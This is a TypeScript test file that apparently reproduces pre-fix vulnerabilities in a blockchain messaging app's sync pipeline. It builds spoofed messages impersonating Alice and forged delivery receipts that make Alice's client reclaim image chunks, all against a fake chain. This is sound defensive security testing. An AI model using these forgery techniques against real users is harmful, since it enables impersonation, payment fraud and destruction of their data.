import { Script, fixedPointFrom, hexFrom } from "@ckb-ccc/core";
import { CKB_TESTNET, codec, deriveConversationId, deriveRouteTag } from "@cemp/core";
import {
  MessagePublisher,
  MlDsaV2TxSigner,
  RateLimiter,
  DEFAULT_RATE_LIMITS,
  ResponseLifecycle,
  assembleTextMessage,
  currentRoutingEpoch,
  incomingLogicalMessageId,
  type CempMessageTypeRef,
} from "@cemp/ckb";
import { CempClient, type JsonRpcTransport } from "@cemp/ckb";
import { MockCkbClient, fillHex, hashFromRpcBody } from "@cemp/ckb/testing";
import {
  deriveIdentityKeys,
  mldsaV2KeygenFromSeed,
  mnemonicToSeed,
  wipeIdentityKeyBundle,
  type IdentityKeyBundle,
} from "@cemp/crypto";
import {
  AttachmentRepository,
  BalanceRepository,
  ContactRepository,
  ConversationRepository,
  DatabasePublicationStore,
  LocalSettingsRepository,
  MessageRepository,
  OutgoingTransactionRepository,
  RateLimitRepository,
  SyncCursorRepository,
  WatchedOutpointRepository,
  WorkerLeaseRepository,
  migrate,
} from "@cemp/database";
import { NodeSqliteAdapter } from "@cemp/database/node";
import type { NotificationContent, Notifier } from "@cemp/ui";
import { afterAll, describe, expect, it } from "vitest";
import vectors from "../../cemp-test-vectors/vectors/mldsa-v2.json";
import { InMemoryScheduler, SyncEngine } from "./engine.js";
import { BackoffPolicy } from "./retry.js";
import { buildWorkerSpecs, ingestIncomingCellData, type SyncWorkerDeps } from "./workers.js";

/**
 * SECURITY PHASE A — VULNERABILITY REPRODUCTION (pre-fix).
 *
 * Handoff matrix rows AUTH-01, AUTH-02, RCPT-01/02 and TRNS-01 through the
 * REAL sync pipeline (`ingestIncomingCellData`, the incoming-discovery and
 * reclaim-batch workers) on the REAL database stack. These tests PASS today
 * by asserting the VULNERABLE behaviour; Phase C/D/E are expected to flip
 * them deliberately. Nothing is broadcast: the chain transport is a fake.
 *
 * The stack below mirrors `makeStack` in workers.test.ts (not exported),
 * parameterised by WHICH identity owns the device, so the same harness can
 * play Bob (impersonation victim) and Alice (receipt-forgery victim).
 *
 * See docs/review/PHASE-A-REPRODUCTION.md.
 */

function hexToBytes(hex: string): Uint8Array {
  const bare = hex.startsWith("0x") ? hex.slice(2) : hex;
  const out = new Uint8Array(bare.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = Number.parseInt(bare.slice(2 * i, 2 * i + 2), 16);
  }
  return out;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("");
}

// Deterministic TEST-ONLY identities (BIP39 reference vectors).
const ALICE = deriveIdentityKeys(
  mnemonicToSeed("legal winner thank year wave sausage worth useful legal winner thank yellow"),
);
const BOB = deriveIdentityKeys(
  mnemonicToSeed("letter advice cage absurd amount doctor acoustic avoid letter advice cage above"),
);
const ALICE_PROFILE_ID = hexToBytes("aa".repeat(32));
const BOB_PROFILE_ID = hexToBytes("bb".repeat(32));
const MALLORY_DEVICE = hexToBytes("66".repeat(16));
const signerKeyPair = mldsaV2KeygenFromSeed(hexToBytes(vectors.keygen[0]!.seed));

const MESSAGE_TYPE_REF: CempMessageTypeRef = {
  codeHash: CKB_TESTNET.deployments.cempMessageType!.codeHash,
  hashType: CKB_TESTNET.deployments.cempMessageType!.hashType,
  cellDep: {
    txHash: CKB_TESTNET.deployments.cempMessageType!.txHash,
    index: "0x0",
    depType: "code",
  },
};

/** Arbitrary output locks: "Alice's" lock and Mallory's own lock. */
const ALICE_LOCK = Script.from({
  codeHash: fillHex(0x77, 32),
  hashType: "type",
  args: `0x${"a1".repeat(37)}`,
});
const MALLORY_LOCK = Script.from({
  codeHash: fillHex(0x77, 32),
  hashType: "type",
  args: `0x${"4d".repeat(37)}`,
});

class RecordingNotifier implements Notifier {
  readonly posted: NotificationContent[] = [];
  post(content: NotificationContent): Promise<void> {
    this.posted.push(content);
    return Promise.resolve();
  }
  cancel(): Promise<void> {
    return Promise.resolve();
  }
}

/** Wrap envelope bytes as an indexer message-cell JSON with a chosen output lock. */
function cellJson(
  assembled: ReturnType<typeof assembleTextMessage>,
  outPointByte: number,
  lock: Script,
): unknown {
  const typeArgs = new Uint8Array(81);
  typeArgs[0] = 1;
  typeArgs.set(assembled.routeTag, 1);
  typeArgs.set(assembled.conversationTag, 33);
  typeArgs.set(assembled.messageNonce, 49);
  return {
    out_point: { tx_hash: fillHex(outPointByte, 32), index: "0x0" },
    output: {
      capacity: `0x${fixedPointFrom(500).toString(16)}`,
      lock: { code_hash: lock.codeHash, hash_type: "type", args: lock.args },
      type: {
        code_hash: MESSAGE_TYPE_REF.codeHash,
        hash_type: MESSAGE_TYPE_REF.hashType,
        args: hexFrom(typeArgs),
      },
    },
    output_data: hexFrom(assembled.envelopeBytes),
    block_number: "0x1",
  };
}

function makeTransport(cells: unknown[]): JsonRpcTransport {
  return {
    call(_url, method, params) {
      switch (method) {
        case "get_cells":
          if (params[3] !== undefined) {
            return Promise.resolve({ objects: [], last_cursor: "0x" });
          }
          return Promise.resolve({ objects: cells, last_cursor: "0x" });
        case "get_transaction":
          return Promise.resolve({
            tx_status: { status: "committed", block_hash: fillHex(0x99, 32) },
          });
        case "get_header":
          return Promise.resolve({
            number: "0x100",
            epoch: "0x0",
            timestamp: "0x0",
            hash: fillHex(0x99, 32),
          });
        case "send_transaction":
          return Promise.resolve(hashFromRpcBody(params[0] as Record<string, unknown>));
        case "get_live_cell":
          // The fake chain reports every cell already spent; the batch reclaim
          // therefore marks covered rows reclaimed WITHOUT building a tx (the
          // live-cell reclaim spend is shown in cemp-ckb/receipt-auth.test.ts).
          return Promise.resolve({ cell: null, status: "dead" });
        default:
          return Promise.reject(new Error(`unexpected method ${method}`));
      }
    },
  };
}

interface Device {
  profileId: Uint8Array;
  keys: IdentityKeyBundle;
}

async function makeStack(device: Device, cells: unknown[] = []) {
  const db = new NodeSqliteAdapter();
  await migrate(db);
  const contacts = new ContactRepository(db);
  const conversations = new ConversationRepository(db);
  const messages = new MessageRepository(db);
  const outgoingTxs = new OutgoingTransactionRepository(db);
  const attachments = new AttachmentRepository(db);
  const watchedOutpoints = new WatchedOutpointRepository(db);
  const balances = new BalanceRepository(db);
  const cursors = new SyncCursorRepository(db);
  const leases = new WorkerLeaseRepository(db);
  const localSettings = new LocalSettingsRepository(db);
  const rateLimiter = new RateLimiter(new RateLimitRepository(db), { ...DEFAULT_RATE_LIMITS });
  const walletId = await balances.ensureWallet("main");
  const store = new DatabasePublicationStore(messages, outgoingTxs, {
    watchedOutpoints,
    balances,
    walletId,
    attachments,
  });
  const client = new CempClient({ transport: makeTransport(cells) });
  const signer = new MlDsaV2TxSigner({ keyPair: signerKeyPair, client: new MockCkbClient() });
  const lifecycle = new ResponseLifecycle({ client, signer, messageType: MESSAGE_TYPE_REF, store });
  const publisher = new MessagePublisher({
    client,
    signer,
    messageType: MESSAGE_TYPE_REF,
    store,
    senderProfileId: () => Promise.resolve(device.profileId),
    senderDeviceId: hexToBytes("02".repeat(16)),
  });
  const notifier = new RecordingNotifier();
  const walletLockScript = signer.lockScript();
  const reclaimGroupCalls: { reclaimGroupId: Uint8Array; outpoints: readonly unknown[] }[] = [];
  const deps: SyncWorkerDeps = {
    client,
    messageType: MESSAGE_TYPE_REF,
    lifecycle,
    publisher,
    messages,
    contacts,
    conversations,
    outgoingTxs,
    attachments,
    cursors,
    leases,
    balances,
    rateLimiter,
    walletId,
    walletLock: {
      codeHash: walletLockScript.codeHash,
      hashType: walletLockScript.hashType,
      args: walletLockScript.args,
    },
    notifier,
    engineId: "engine-auth-test",
    ownProfileId: () => Promise.resolve(device.profileId),
    ownKemSecretKey: device.keys.mlKem.secretKey,
    localSettings,
    reclaimAttachmentGroup: (input) => {
      reclaimGroupCalls.push(input);
      return Promise.resolve(null);
    },
  };
  const engine = new SyncEngine({
    scheduler: new InMemoryScheduler(),
    leases,
    cursors,
    workers: buildWorkerSpecs(deps),
    backoff: new BackoffPolicy({ jitter: 0 }),
    engineId: "engine-auth-test",
  });
  return {
    db,
    engine,
    deps,
    messages,
    contacts,
    conversations,
    attachments,
    balances,
    outgoingTxs,
    walletId,
    reclaimGroupCalls,
  };
}

type Stack = Awaited<ReturnType<typeof makeStack>>;

const BOB_DEVICE: Device = { profileId: BOB_PROFILE_ID, keys: BOB };
const ALICE_DEVICE: Device = { profileId: ALICE_PROFILE_ID, keys: ALICE };

/** Mallory's impersonation: Alice's PUBLIC id + Bob's PUBLIC KEM key. No secrets. */
function mallorySpoofsAliceToBob(text: string) {
  return assembleTextMessage({
    text,
    senderProfileId: ALICE_PROFILE_ID,
    recipientProfileId: BOB_PROFILE_ID,
    recipientKemPublicKey: BOB.mlKem.publicKey,
    senderDeviceId: MALLORY_DEVICE,
    receiptRequest: 1,
  });
}

/** Bob already knows Alice (pinned contact + conversation). Returns that conversation id. */
async function bobKnowsAlice(stack: Stack): Promise<number> {
  const alice = await stack.contacts.create({
    displayName: "Alice",
    profileIdHex: bytesToHex(ALICE_PROFILE_ID),
  });
  return (await stack.conversations.getOrCreateForContact(alice.id)).id;
}

async function rowFor(stack: Stack, messageId: Uint8Array) {
  return stack.messages.getByLogicalId(incomingLogicalMessageId(messageId));
}

/* ── AUTH-01 / AUTH-02 / TRNS-01: impersonation ─────────────────────────── */

describe("VULN reproduction (pre-fix): AUTH-01 spoofed sender lands in Alice's conversation (chain discovery)", () => {
  it("a Mallory-funded cell claiming Alice is inserted into Bob's EXISTING Alice conversation and auto-acked to 'Alice'", async () => {
    const forged = mallorySpoofsAliceToBob("it's alice. new address, please pay here");
    const stack = await makeStack(BOB_DEVICE, [cellJson(forged, 0xe1, MALLORY_LOCK)]);
    try {
      const aliceConversationId = await bobKnowsAlice(stack);
      expect(await stack.engine.runWorker("incoming-discovery")).toBe("success");

      const row = await rowFor(stack, forged.messageId);
      expect(row?.state).toBe("received");
      expect(row?.body).toBe("it's alice. new address, please pay here");
      // PRE-FIX: displayed inside Alice's conversation, no new contact.
      expect(row?.conversationId).toBe(aliceConversationId);
      expect(await stack.contacts.list()).toHaveLength(1);
      // Bob's device also queues an auto-ack addressed back to "Alice" —
      // Bob spends capacity responding to a message Alice never sent.
      const responses = (await stack.messages.listByState(["queued"])).filter((m) =>
        m.logicalMessageId.startsWith("response:"),
      );
      expect(responses).toHaveLength(1);
      expect(responses[0]!.conversationId).toBe(aliceConversationId);
    } finally {
      await stack.db.close();
    }
  });
});

describe("VULN reproduction (pre-fix): AUTH-02 output lock is ignored by ingestion", () => {
  it("cells locked to Alice's lock and to Mallory's own lock are ingested identically as 'from Alice'", async () => {
    const underAliceLock = mallorySpoofsAliceToBob("under alice's lock");
    const underMalloryLock = mallorySpoofsAliceToBob("under mallory's lock");
    const stack = await makeStack(BOB_DEVICE, [
      // Mallory spends only her own inputs; the OUTPUT lock is free choice.
      cellJson(underAliceLock, 0xe2, ALICE_LOCK),
      cellJson(underMalloryLock, 0xe3, MALLORY_LOCK),
    ]);
    try {
      const aliceConversationId = await bobKnowsAlice(stack);
      expect(await stack.engine.runWorker("incoming-discovery")).toBe("success");
      const a = await rowFor(stack, underAliceLock.messageId);
      const m = await rowFor(stack, underMalloryLock.messageId);
      expect(a?.state).toBe("received");
      expect(m?.state).toBe("received");
      expect(a?.conversationId).toBe(aliceConversationId);
      expect(m?.conversationId).toBe(aliceConversationId);
    } finally {
      await stack.db.close();
    }
  });
});

describe("VULN reproduction (pre-fix): TRNS-01 identical spoofed bytes via CKB and via LoRa (source: null)", () => {
  it("both transports accept the spoof into Alice's conversation; only the auto-ack differs", async () => {
    const forged = mallorySpoofsAliceToBob("same bytes, two transports");
    const cellDataHex = bytesToHex(forged.envelopeBytes);

    const chain = await makeStack(BOB_DEVICE);
    const lora = await makeStack(BOB_DEVICE);
    try {
      const chainConv = await bobKnowsAlice(chain);
      const loraConv = await bobKnowsAlice(lora);
      await ingestIncomingCellData(chain.deps, BOB_PROFILE_ID, cellDataHex, {
        txHash: fillHex(0xe4, 32),
        outpointIndex: 0,
      });
      await ingestIncomingCellData(lora.deps, BOB_PROFILE_ID, cellDataHex, null);

      const viaChain = await rowFor(chain, forged.messageId);
      const viaLora = await rowFor(lora, forged.messageId);
      // PRE-FIX: identical acceptance — both "received", both in Alice's conversation.
      expect(viaChain?.state).toBe("received");
      expect(viaLora?.state).toBe("received");
      expect(viaChain?.conversationId).toBe(chainConv);
      expect(viaLora?.conversationId).toBe(loraConv);
      expect(viaChain?.body).toBe(viaLora?.body);
      // The only difference is transport plumbing, not authentication: the
      // chain path records a chain ref and queues an auto-ack; LoRa does not.
      const queued = async (s: Stack) =>
        (await s.messages.listByState(["queued"])).filter((x) =>
          x.logicalMessageId.startsWith("response:"),
        ).length;
      expect(await queued(chain)).toBe(1);
      expect(await queued(lora)).toBe(0);
    } finally {
      await chain.db.close();
      await lora.db.close();
    }
  });
});

/* ── RCPT-01 / RCPT-02 / TRNS-01: forged receipts reach the lifecycle ───── */

const RECLAIM_GROUP_ID = new Uint8Array(16).fill(0x26);

function testManifest(): codec.AttachmentManifestV1Encodable {
  return {
    attachment_id: new Uint8Array(16).fill(0x11),
    ckbfs_root: { tx_hash: new Uint8Array(32).fill(0x22), index: 0 },
    chunk_outpoints: [
      { tx_hash: new Uint8Array(32).fill(0x22), index: 0 },
      { tx_hash: new Uint8Array(32).fill(0x22), index: 1 },
    ],
    encrypted_size: 4096n,
    plaintext_size: 3800n,
    mime_type: new TextEncoder().encode("image/webp"),
    width: 640,
    height: 480,
    thumbnail: undefined,
    content_hash: new Uint8Array(32).fill(0xc1),
    cipher_hash: new Uint8Array(32).fill(0xc2),
    encryption_nonce: new Uint8Array(12).fill(0x0c),
    encryption_algorithm: { family: 0x03, parameter: 1 },
    reclaim_group_id: RECLAIM_GROUP_ID,
  };
}

const CELL_SHANNON = fixedPointFrom(500);
const ALICE_MESSAGE_TX = fillHex(0xa1, 32);

/**
 * Alice's device state: one genuine outgoing image message to Bob, committed
 * on-chain, its capacity reserved. Returns the genuine published envelope
 * (what any chain observer can read) and the row id.
 */
function alicePublishesImageToBob() {
  return assembleTextMessage({
    text: "",
    contentType: 0x03,
    attachmentManifests: [testManifest()],
    senderProfileId: ALICE_PROFILE_ID,
    recipientProfileId: BOB_PROFILE_ID,
    recipientKemPublicKey: BOB.mlKem.publicKey,
    senderDeviceId: hexToBytes("01".repeat(16)),
    receiptRequest: 1,
  });
}

async function aliceHasPendingImageToBob(
  stack: Stack,
  published: ReturnType<typeof alicePublishesImageToBob> = alicePublishesImageToBob(),
) {
  const bob = await stack.contacts.create({
    displayName: "Bob",
    profileIdHex: bytesToHex(BOB_PROFILE_ID),
  });
  const conv = await stack.conversations.getOrCreateForContact(bob.id);
  const row = await stack.messages.insert({
    conversationId: conv.id,
    direction: "outgoing",
    body: null,
    logicalMessageId: "lm-alice-image",
    state: "available_on_chain",
  });
  await stack.messages.setEnvelopeMessageId(row.id, bytesToHex(published.messageId));
  await stack.messages.setChainRef(row.id, { txHash: ALICE_MESSAGE_TX, outpointIndex: 0 });
  await stack.attachments.create({
    messageId: row.id,
    kind: "image",
    byteLength: 3800,
    manifest: codec.encodeAttachmentManifestV1(testManifest()),
  });
  // Publication journal + capacity reservation (what the publish monitor records).
  await stack.outgoingTxs.record({
    txHash: ALICE_MESSAGE_TX,
    purpose: "message:lm-alice-image",
    state: "committed",
    capacityShannon: CELL_SHANNON.toString(),
  });
  await stack.balances.setChainBalances(
    stack.walletId,
    fixedPointFrom(10_000),
    fixedPointFrom(10_000),
  );
  await stack.balances.reserveCapacity(stack.walletId, CELL_SHANNON);
  return { published, rowId: row.id };
}

/**
 * Mallory forges Bob's receipts from Alice's PUBLISHED cell bytes + Alice's
 * PUBLIC KEM key: the cleartext header yields message_id and Alice's id; the
 * cleartext conversation_id confirms Bob among public profile ids.
 */
function malloryForgesBobReceipts(publishedCellData: Uint8Array) {
  const { header } = codec.decodeCempEnvelopeV1(publishedCellData);
  const candidates = [hexToBytes("4d".repeat(32)), BOB_PROFILE_ID];
  const bobId = candidates.find((c) =>
    codec.bytesEqual(deriveConversationId(header.sender_profile_id, c), header.conversation_id),
  )!;
  return assembleTextMessage({
    text: "",
    senderProfileId: bobId,
    recipientProfileId: header.sender_profile_id,
    recipientKemPublicKey: ALICE.mlKem.publicKey,
    senderDeviceId: MALLORY_DEVICE,
    receipts: [
      { messageId: header.message_id, status: 0x01 },
      { messageId: header.message_id, status: 0x05 },
    ],
  });
}

describe("VULN reproduction (pre-fix): RCPT-01/02 forged receipts through the sync pipeline", () => {
  it("chain discovery: forged 0x01+0x05 → reclaim_queued, reserved→reclaimable, chunk gate open, chunks reclaimed", async () => {
    const stack = await makeStack(ALICE_DEVICE);
    try {
      const { published, rowId } = await aliceHasPendingImageToBob(stack);
      const forged = malloryForgesBobReceipts(published.envelopeBytes);
      // Deliver the forgery as a discovered cell (Mallory funds + signs it).
      await ingestIncomingCellData(stack.deps, ALICE_PROFILE_ID, bytesToHex(forged.envelopeBytes), {
        txHash: fillHex(0xe5, 32),
        outpointIndex: 0,
      });

      // PRE-FIX state + balance effects, though Bob never received anything.
      expect((await stack.messages.getById(rowId))?.state).toBe("reclaim_queued");
      const balance = await stack.balances.getBalance(stack.walletId);
      expect(balance.reservedShannon).toBe(0n);
      expect(balance.reclaimableShannon).toBe(CELL_SHANNON);
      expect((await stack.attachments.listForMessage(rowId))[0]?.remoteDownloaded).toBe(true);
      // No chat bubble for the receipt-only forgery.
      expect(await stack.messages.listByState(["received"])).toHaveLength(0);

      // Next reclaim pass: the message is reclaimed and — because the forged
      // 0x05 opened the gate — the IMAGE CHUNKS are handed to the group
      // reclaim (the chunks are the only copy of the image; spending them
      // destroys it for Bob).
      expect(await stack.engine.runWorker("reclaim-batch")).toBe("success");
      expect((await stack.messages.getById(rowId))?.state).toBe("reclaimed");
      expect(stack.reclaimGroupCalls).toHaveLength(1);
      expect(bytesToHex(stack.reclaimGroupCalls[0]!.reclaimGroupId)).toBe(
        bytesToHex(RECLAIM_GROUP_ID),
      );
      expect(stack.reclaimGroupCalls[0]!.outpoints).toEqual([
        { txHash: ALICE_MESSAGE_TX, index: "0x0" },
        { txHash: `0x${"22".repeat(32)}`, index: "0x0" },
        { txHash: `0x${"22".repeat(32)}`, index: "0x1" },
      ]);
    } finally {
      await stack.db.close();
    }
  });

  it("incoming-discovery worker: the forged receipt cell is found by Alice's PUBLIC route tag and applied", async () => {
    // Route tag = deriveRouteTag(alice public id, epoch): Mallory addresses
    // Alice's inbox with no secret. The worker scans that tag and applies it.
    const published = alicePublishesImageToBob();
    const forged = malloryForgesBobReceipts(published.envelopeBytes);
    expect(forged.routeTag).toEqual(deriveRouteTag(ALICE_PROFILE_ID, currentRoutingEpoch()));
    const stack = await makeStack(ALICE_DEVICE, [cellJson(forged, 0xe6, MALLORY_LOCK)]);
    try {
      const { rowId } = await aliceHasPendingImageToBob(stack, published);
      expect(await stack.engine.runWorker("incoming-discovery")).toBe("success");
      expect((await stack.messages.getById(rowId))?.state).toBe("reclaim_queued");
      expect((await stack.attachments.listForMessage(rowId))[0]?.remoteDownloaded).toBe(true);
    } finally {
      await stack.db.close();
    }
  });

  it("TRNS-01 receipts: the same forged receipt bytes via LoRa (source: null) have the same lifecycle effect", async () => {
    const chain = await makeStack(ALICE_DEVICE);
    const lora = await makeStack(ALICE_DEVICE);
    try {
      const published = alicePublishesImageToBob();
      const c = await aliceHasPendingImageToBob(chain, published);
      const loraRow = (await aliceHasPendingImageToBob(lora, published)).rowId;
      const forgedHex = bytesToHex(malloryForgesBobReceipts(published.envelopeBytes).envelopeBytes);
      await ingestIncomingCellData(chain.deps, ALICE_PROFILE_ID, forgedHex, {
        txHash: fillHex(0xe7, 32),
        outpointIndex: 0,
      });
      await ingestIncomingCellData(lora.deps, ALICE_PROFILE_ID, forgedHex, null);

      for (const [s, id] of [
        [chain, c.rowId],
        [lora, loraRow],
      ] as const) {
        expect((await s.messages.getById(id))?.state).toBe("reclaim_queued");
        expect((await s.balances.getBalance(s.walletId)).reclaimableShannon).toBe(CELL_SHANNON);
        expect((await s.attachments.listForMessage(id))[0]?.remoteDownloaded).toBe(true);
      }
    } finally {
      await chain.db.close();
      await lora.db.close();
    }
  });
});

afterAll(() => {
  wipeIdentityKeyBundle(ALICE);
  wipeIdentityKeyBundle(BOB);
});
